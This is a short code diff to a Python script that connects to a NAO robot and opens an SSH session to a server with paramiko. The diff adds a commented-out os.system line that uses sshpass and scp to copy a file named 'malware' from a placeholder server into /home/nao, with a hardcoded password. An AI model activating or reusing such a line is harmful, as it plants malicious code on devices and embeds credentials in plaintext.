@@ -15,6 +15,7 @@ if __name__ == "__main__":
         session = qi.Session()
         try:
             session.connect("tcp://" + ip_addr + ":" + str(9559))
+            #os.system('sshpass -p "password" scp username@server:/path/to/malware /home/nao')
             ssh = paramiko.SSHClient() 
             ssh.load_host_keys(os.path.expanduser(os.path.join("~", ".ssh", "known_hosts")))
             ssh.connect(server, username=username, password=password)
